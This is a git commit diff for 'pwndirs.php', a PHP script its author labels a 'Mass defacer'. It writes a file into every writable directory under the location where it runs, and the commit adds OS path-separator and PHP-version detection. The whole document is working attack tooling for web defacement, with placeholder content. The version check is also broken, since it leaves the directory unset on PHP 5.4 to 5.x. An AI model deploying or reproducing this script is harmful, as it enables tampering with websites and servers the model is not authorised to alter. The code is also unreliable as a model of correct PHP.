58f7fb05db2dea26384eb463a361337d0006c5d9
WSTNPHX <info@sctn9.com>
2018-04-18 09:43:32 -0700

    added php ver and os detection

--- pwndirs.php
+++ pwndirs.php
@@ -1,17 +1,56 @@
 <?php
 
-# pwndirs.php - Write file to every dir below __DIR__
-# v. 2018-04-16
+# pwndirs.php - Mass defacer. What?
+# v. 2018-04-18
 
-$dir = __DIR__;
+# Functions
+##
 
+# Slash detection
+function slashDetect() {
+    if ( function_exists('php_uname') ) {
+        if ( strtoupper(substr(php_uname('s'), 0, 3)) === 'WIN' ) {
+            $OSlash = '\\';
+        } else {
+            $OSlash = '/';
+        }
+    } elseif ( strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ) {
+        $OSlash = '\\';
+    } else {
+        $OSlash = '/';
+    }
+
+    return $OSlash;
+}
+
+# Find PHP version and current dir
+function currentDir() {
+    $vers[0] = '1';
+    $vers[1] = '1';
+
+    if ( function_exists('phpversion') ) {
+        $vers = explode('.', substr(phpversion(), 0, 3));
+    }
+
+    if ($vers[0] <= 5) {
+        if ($vers[1] <= 3) {
+            $curDir = dirname(__FILE__);
+        }
+    } else {
+        $curDir = __DIR__;
+    }
+    return $curDir;
+}
+
+$dir = currentDir();
+$slash = slashDetect();
 $filesArray = scandir($dir);
 $dirsArray = [];
 $fileName = 'test.txt';
 $fileContent = "This is a test.\n";
 
 foreach ($filesArray as $file) {
-    $dirsPath = $dir . '/' . $file;
+    $dirsPath = $dir . $slash . $file;
 
     if ( is_writable($file) ) {
         if ($file === '.' or $file === '..') {
@@ -23,6 +62,6 @@ foreach ($filesArray as $file) {
 }
 
 foreach ($dirsArray as $pwned) {
-    $file = $pwned . '/' . $fileName;
+    $file = $pwned . $slash . $fileName;
     file_put_contents($file, $fileContent);
 }
